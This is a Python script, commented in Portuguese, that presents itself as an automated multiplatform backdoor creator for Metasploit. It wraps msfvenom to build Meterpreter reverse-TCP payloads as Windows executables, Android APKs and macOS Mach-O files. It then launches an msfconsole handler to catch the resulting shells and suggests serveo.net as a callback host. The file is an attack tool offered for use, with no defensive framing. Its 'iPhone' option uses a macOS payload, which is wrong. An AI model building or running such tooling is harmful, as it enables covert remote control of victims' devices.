import subprocess

# Função para exibir uma mensagem de cabeçalho
def banner():
    print("""
    #############################################
    #     Criador de Backdoors Multiplataforma  #
    #     Automatizado para Metasploit          #
    #         Desenvolvido por Safelock AI      #
    #############################################
    """)

# Função para criar um payload
def create_payload(platform):
    print(f"\n[INFO] Criando Backdoor para {platform}...\n")
    
    # Solicitar ao usuário os parâmetros necessários
    lhost = input("Digite o LHOST (exemplo: 192.168.1.5 ou serveo.net): ")
    lport = input("Digite o LPORT (exemplo: 4444): ")
    output_file = input(f"Digite o nome do arquivo de saída (exemplo: backdoor.{platform}): ")

    # Escolher o tipo de payload
    if platform == "Windows":
        payload = "windows/meterpreter/reverse_tcp"
        output_extension = ".exe"
    elif platform == "Android":
        payload = "android/meterpreter/reverse_tcp"
        output_extension = ".apk"
    elif platform == "iPhone":
        payload = "osx/x64/meterpreter_reverse_tcp"
        output_extension = ".macho"
    else:
        print("[ERRO] Plataforma inválida!")
        return

    # Adicionar a extensão correta ao arquivo de saída, se necessário
    if not output_file.endswith(output_extension):
        output_file += output_extension

    # Comando para criar o payload
    payload_command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output_file}"

    # Executar o comando no terminal
    try:
        subprocess.run(payload_command, shell=True, check=True)
        print(f"[SUCESSO] Backdoor gerado! Arquivo salvo como '{output_file}'.\n")
    except subprocess.CalledProcessError as e:
        print(f"[ERRO] Falha ao criar o payload: {e}\n")

# Função para configurar o Metasploit e aguardar conexões reversas
def wait_for_reverse_connection(platform):
    print(f"\n[INFO] Aguardando conexão reversa de {platform}...\n")
    
    # Solicitar ao usuário os parâmetros necessários
    lhost = input("Digite o LHOST (seu IP ou serveo.net): ")
    lport = input("Digite o LPORT (porta que o payload irá se conectar): ")

    # Escolher o tipo de payload
    if platform == "Windows":
        payload = "windows/meterpreter/reverse_tcp"
    elif platform == "Android":
        payload = "android/meterpreter/reverse_tcp"
    elif platform == "iPhone":
        payload = "osx/x64/meterpreter_reverse_tcp"
    else:
        print("[ERRO] Plataforma inválida!")
        return

    # Configurar o Metasploit para aguardar a conexão reversa
    try:
        print("[INFO] Iniciando o Metasploit...")
        msf_command = f"msfconsole -x \"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; exploit\""
        subprocess.run(msf_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[ERRO] Falha ao iniciar o Metasploit: {e}\n")

# Função principal para exibir o menu e processar a escolha
def main():
    while True:
        banner()
        
        # Menu de opções
        print("\nEscolha uma opção:")
        print("1. Criar Backdoor para Windows (.exe)")
        print("2. Criar Backdoor para Android (.apk)")
        print("3. Criar Backdoor para iPhone (.macho)")
        print("4. Esperar Conexão Reversa de Windows")
        print("5. Esperar Conexão Reversa de Android")
        print("6. Esperar Conexão Reversa de iPhone")
        print("7. Sair")

        # Obter a escolha do usuário
        choice = input("\nDigite o número da opção desejada: ").strip()

        # Processar a escolha
        if choice == '1':
            create_payload("Windows")
        elif choice == '2':
            create_payload("Android")
        elif choice == '3':
            create_payload("iPhone")
        elif choice == '4':
            wait_for_reverse_connection("Windows")
        elif choice == '5':
            wait_for_reverse_connection("Android")
        elif choice == '6':
            wait_for_reverse_connection("iPhone")
        elif choice == '7':
            print("[INFO] Saindo do programa. Até mais!\n")
            break
        else:
            print("[ERRO] Opção inválida! Tente novamente.\n")

if __name__ == "__main__":
    main()
